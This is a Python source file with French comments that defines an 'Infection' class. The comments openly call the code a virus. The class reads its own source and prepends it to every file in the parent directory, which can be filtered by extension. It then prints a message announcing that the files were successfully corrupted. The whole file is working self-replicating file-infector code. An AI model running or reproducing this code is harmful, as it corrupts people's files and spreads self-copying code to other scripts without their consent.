class Infection:
    def __init__(self, extension: str = ""):
        self.__extension = extension

    @property
    def extension(self):
        return self.__extension

    def print_in_file(self, lines, filename):
        """Ecrit dans un fichier

        PRE : lines(str) : chaine correspondant au virus , filename(str) : fichier qui sera edité
        POST : copie le contenu de lines dans le filename
        """
        try:
            with open(filename, 'w') as f:
                f.writelines(lines)
        except FileNotFoundError:
            print("Fichier introuvable")

    def read_file(self, filename):
        """Lit un fichier 

        PRE : filename : nom du fichier
        POST : chaine de caractère correspondant contenu du fichier 
        """
        try:
            with open(filename) as f:
                code = ""
                for line in f:
                    code += line
            return code
        except FileNotFoundError:
            print("Fichier Introuvable")

    # print("fichier lu" , read_file(__file__))

    def insert_lines_at_start(self, lines, filename):
        """Remplace le contenu dans fichier par le code(virus)

        PRE : lines(str) chaine réprésentant notre code(virus) , filename(str) nom du fichier qui sera edité
        POST : imprime le virus au début  du fichier
        """

        new_lines = lines+self.read_file(filename)
        self.print_in_file(new_lines, filename)

    def insert_lines_at_files_in_list(self, lines, list_of_files):
        """Pour chaque fichier présent dans la liste des fichiers , insere une des ligne au début

        PRE : lines(str) chaine représentant notre code(virus) , list_of_files(str) notre liste de fichier dans le répertoire
        POST : insere le code(virus) dans chaque fichier 
        """

        for f in list_of_files:
            self.insert_lines_at_start(lines, f)
        print(
            f"\nFichier corrompu avec succès✅. Jetez un coup d'oeil sur vos fichier {self.extension}")

    # Scan
    # Par convention __attribute__ est un attribut d'un module
    # Importer un module qui contient __file__ retourne le chemin du fichier à partir duquel

    def get_dir(self):
        """Recupere le le chemin absolu du repertoire ou se trouve le fichier

        PRE: utilise le nom du fichier __file__ 
        POST : renvoie une chaine de caractère correspondant au chemin
        """

        if "\\" in __file__:
            p = __file__.split('\\')
            return "\\".join(p[:-2])
        elif "/" in __file__:
            p = __file__.split('/')
            return "/".join(p[:-2])

    def get_file_in_current_dir(self):
        """renvoie une liste des fichiers présents dans le répertoire ou se trouve le fichier
        """

        import os
        # print(os.listdir(self.get_dir()))
        if self.extension:
            return filter(lambda x: x[x.index(".")+1:] == self.extension, [filename for filename in os.listdir(self.get_dir()) if "." in filename and filename != "main.py" and filename != ".gitignore"])
        return [filename for filename in os.listdir(self.get_dir()) if "." in filename and filename != "main.py"]

    def get_virus_code(self):
        """Lit le fichier du fichier actuel

        POST: renvoie le contenu du fichier actuel
        """

        return self.read_file(__file__)

    # Infection

    def infect(self):
        """Insere le virus dans les autres fichiers

        PRE get_virus_code() : 
        """

        self.insert_lines_at_files_in_list(
            self.get_virus_code(), self.get_file_in_current_dir())
